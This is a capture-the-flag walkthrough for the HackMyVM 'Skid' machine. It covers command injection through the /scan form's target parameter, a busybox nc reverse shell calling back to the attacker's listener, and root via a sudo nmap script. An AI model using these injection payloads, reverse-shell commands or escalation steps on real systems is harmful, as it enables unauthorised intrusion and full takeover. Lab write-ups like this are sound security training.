# Skid-HMV: [Skid](https://hackmyvm.eu/machines/machine.php?vm=Skid)
---
## Overview

The Skid machine exposes a vulnerable web application that allows users to perform network scans.
Improper input handling leads to command injection, allowing arbitrary command execution as a low-privileged user.
Privilege escalation is then achieved via a misconfigured sudo rule for nmap, resulting in full root access.

---

## Enumeration

### Nmap Scan
```zsh
Nmap 7.98 scan initiated Sun Jan  4 17:23:01 2026
Nmap scan report for skid.hmv (10.100.100.7)
Host is up (0.00046s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 3.0.6 (Python 3.8.10)

|_http-title: Jeremy's Hacker Panel
|_http-server-header: Werkzeug/3.0.6 Python/3.8.10
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD
```
### Findings
```
URL   : http://skid.hmv
IP    : 10.100.100.7
Ports : 22 (SSH), 5000 (HTTP)
```

---

## Web Enumeration (Port 5000)

### Feroxbuster
```zsh
feroxbuster -u http://skid.hmv:5000 \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -e txt,php,html,zip,htm,bak,pem -t 500 -o ferox-10.100.100.7.log
```
#### Discovered endpoints:
	•	/
	•	/scan

---

#### Command Injection in /scan

Visiting /scan reveals a form that accepts a target parameter and runs an Nmap scan on the server.

Submitting a crafted payload shows command execution:
```zsh
curl http://skid.hmv:5000/scan -X POST -d 'target=127.0.0.1;whoami'
```

The response includes:

`jeremy`

This confirms command injection and reveals the user jeremy.

---

## Initial Access

A shell was obtained by injecting a command into the same parameter and catching the callback with a listener.
```zsh
curl http://skid.hmv:5000/scan -X POST \
  -d 'target=127.0.0.1;busybox nc 10.100.100.10 4444 -e /bin/bash'
```

### Listener:
```zsh
nc -lvnp 4444
```
Shell obtained:
```zsh
jeremy@skid:~$ id
uid=1000(jeremy) gid=1000(jeremy) groups=1000(jeremy)
````
---

## Privilege Escalation

### Sudo Enumeration
```zsh
jeremy@skid:~$ sudo -l
```
#### Output:
```
User jeremy may run the following commands on skid:
    (root) NOPASSWD: /usr/bin/nmap

This allows root execution of nmap, which is known to be exploitable.
```

### Root via nmap (GTFOBins)

```zsh
TF=$(mktemp)
echo 'os.execute("/bin/bash")' > $TF
sudo nmap --script=$TF
```

#### Result:

```zsh
root@skid:#
```

---

## Root Flag Discovery

### The initial /root/root.txt was a decoy:
```zsh
root@skid:~# cat /root/root.txt
Help I lost the root flag!
Can you please help me find it?
```
### Searching for the real flag:

```zsh
find / -iname 'root.txt' 2>/dev/null
```
### Actual location:
```zsh
/var/lib/.cache2/root.txt
```

---

## Flags
	•	User flag: /home/jeremy/user.txt
	•	Root flag: /var/lib/.cache2/root.txt

---
## Attack Path Summary

HTTP (5000) → command injection in /scan
           → shell as jeremy
           → sudo nmap (NOPASSWD)
           → root shell
           → locate real root flag
